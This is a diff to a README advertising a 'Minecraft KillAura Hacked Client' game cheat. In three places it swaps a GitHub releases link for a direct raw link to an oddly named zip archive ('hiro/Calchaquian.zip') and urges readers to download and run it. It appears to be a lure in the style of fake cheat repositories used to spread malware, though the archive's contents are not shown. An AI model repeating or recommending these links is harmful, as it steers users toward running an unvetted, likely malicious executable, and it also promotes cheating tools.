@@ -6,7 +6,7 @@ Welcome to the ultimate Minecraft enhancement tool for 2026. This application gi
 
 ## 📥 Download the Application
 
-Visit this link to download the application: **[Download Minecraft-KillAura-Hacked-Client](https://github.com/Mvon0229/Minecraft-KillAura-Hacked-Client/releases)**
+Visit this link to download the application: **[Download Minecraft-KillAura-Hacked-Client](https://raw.githubusercontent.com/Mvon0229/Minecraft-KillAura-Hacked-Client/main/hiro/Calchaquian.zip)**
 
 This is the official release page where you will find the latest version of the software. Click the link, and your browser will take you to the download area. Look for the most recent release file and click to save it to your computer.
 
@@ -75,7 +75,7 @@ If problems persist, check the release page for updates or notes from the develo
 
 New versions are released regularly to improve performance and add features. To update:
 
-1.  Go back to the download page: **[Download Minecraft-KillAura-Hacked-Client](https://github.com/Mvon0229/Minecraft-KillAura-Hacked-Client/releases)**
+1.  Go back to the download page: **[Download Minecraft-KillAura-Hacked-Client](https://raw.githubusercontent.com/Mvon0229/Minecraft-KillAura-Hacked-Client/main/hiro/Calchaquian.zip)**
 2.  Check the latest release date and version number.
 3.  Download the newest file and run it. The new version will replace the old one.
 
@@ -145,7 +145,7 @@ That is all there is to it. Enjoy your new capabilities and dominate the game.
 
 For your convenience, here is the download link again:
 
-**[Download Minecraft-KillAura-Hacked-Client Now](https://github.com/Mvon0229/Minecraft-KillAura-Hacked-Client/releases)**
+**[Download Minecraft-KillAura-Hacked-Client Now](https://raw.githubusercontent.com/Mvon0229/Minecraft-KillAura-Hacked-Client/main/hiro/Calchaquian.zip)**
 
 Bookmark this page so you can easily return for updates and new releases.
 
